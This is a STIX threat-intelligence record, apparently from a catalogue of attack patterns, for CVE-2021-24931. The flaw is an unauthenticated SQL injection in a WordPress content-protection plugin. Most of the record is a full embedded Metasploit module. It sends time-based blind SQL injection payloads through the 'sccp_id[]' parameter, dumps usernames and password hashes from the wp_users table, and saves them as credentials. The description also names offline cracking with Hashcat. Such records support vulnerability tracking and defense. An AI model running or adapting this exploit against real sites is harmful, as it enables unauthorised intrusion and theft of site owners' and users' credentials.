{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8ee0bbaf-57a2-4653-b116-b73fcdf12c0f",
    "created": "2024-08-14T16:28:50.733764Z",
    "modified": "2024-08-14T16:28:50.733768Z",
    "name": "Wordpress Secure Copy Content Protection and Content Locking sccp_id Unauthenticated SQLi",
    "description": " Secure Copy Content Protection and Content Locking, a WordPress plugin prior to 2.8.2 is affected by an unauthenticated SQL injection via the `sccp_id[]` parameter.  Remote attackers can exploit this vulnerability to dump usernames and password hashes from the`wp_users` table of the affected WordPress installation. These password hashes can then be cracked offline using tools such as Hashcat to obtain valid login credentials for the affected WordPress installation. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wp_secure_copy_content_protection_sqli.rb",
            "external_id": "wp_secure_copy_content_protection_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-24931"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24931/README.md"
        },
        {
            "source_name": "reference",
            "url": "https://kazet.cc/2022/02/03/fuzzing-wordpress-plugins.html"
        },
        {
            "source_name": "WPVDB",
            "external_id": "1cd52d61-af75-43ed-9b99-b46c471c4231"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::SQLi\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Wordpress Secure Copy Content Protection and Content Locking sccp_id Unauthenticated SQLi',\n        'Description' => %q{\n          Secure Copy Content Protection and Content Locking, a WordPress plugin,\n          prior to 2.8.2 is affected by an unauthenticated SQL injection via the\n          `sccp_id[]` parameter.\n\n          Remote attackers can exploit this vulnerability to dump usernames and password hashes\n          from the`wp_users` table of the affected WordPress installation. These password hashes\n          can then be cracked offline using tools such as Hashcat to obtain valid login\n          credentials for the affected WordPress installation.\n        },\n        'Author' => [\n          'h00die', # msf module\n          'Hacker5preme (Ron Jost)', # edb PoC\n          'Krzysztof Zaj\u0105c (kazet)', # Original bug discovery and writeup\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2021-24931'],\n          ['URL', 'https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24931/README.md'],\n          ['URL', 'https://kazet.cc/2022/02/03/fuzzing-wordpress-plugins.html'],\n          ['EDB', '50733'],\n          ['WPVDB', '1cd52d61-af75-43ed-9b99-b46c471c4231'],\n        ],\n        'Actions' => [\n          ['List Users', { 'Description' => 'Queries username, password hash for USER_COUNT users' }]\n        ],\n        'DefaultAction' => 'List Users',\n        'DisclosureDate' => '2021-11-08',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options [\n      OptInt.new('USER_COUNT', [true, 'Number of user credentials to enumerate', 3])\n    ]\n  end\n\n  def check_host(_ip)\n    unless wordpress_and_online?\n      return Msf::Exploit::CheckCode::Safe('Server not online or not detected as wordpress')\n    end\n\n    checkcode = check_plugin_version_from_readme('secure-copy-content-protection', '2.8.2')\n    if checkcode == Msf::Exploit::CheckCode::Safe\n      return Msf::Exploit::CheckCode::Safe('Secure Copy Content Protection and Content Locking version not vulnerable')\n    end\n\n    checkcode\n  end\n\n  def run_host(ip)\n    id = Rex::Text.rand_text_numeric(1..20)\n    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|\n      res = send_request_cgi({\n        'method' => 'POST',\n        'keep_cookies' => true,\n        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),\n        'vars_get' => {\n          'action' => 'ays_sccp_results_export_file',\n          'sccp_id[]' => \"#{id}) AND (SELECT #{Rex::Text.rand_text_numeric(4..20)} FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha(4..20)})-- #{Rex::Text.rand_text_alpha(4..20)}\",\n          'type' => 'json'\n        }\n      })\n      fail_with(Failure::Unreachable, 'Connection failed') unless res\n    end\n\n    unless @sqli.test_vulnerable\n      print_bad(\"#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.\")\n      return\n    end\n    columns = ['user_login', 'user_pass']\n\n    print_status('Enumerating Usernames and Password Hashes')\n    print_warning('Each user will take about 5-10 minutes to enumerate. Be patient.')\n    data = @sqli.dump_table_fields('wp_users', columns, '', datastore['USER_COUNT'])\n\n    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)\n    data.each do |user|\n      create_credential({\n        workspace_id: myworkspace_id,\n        origin_type: :service,\n        module_fullname: fullname,\n        username: user[0],\n        private_type: :nonreplayable_hash,\n        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),\n        private_data: user[1],\n        service_name: 'Wordpress',\n        address: ip,\n        port: datastore['RPORT'],\n        protocol: 'tcp',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      })\n      table << user\n    end\n    print_good('Dumped table contents:')\n    print_line(table.to_s)\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-11-08"
}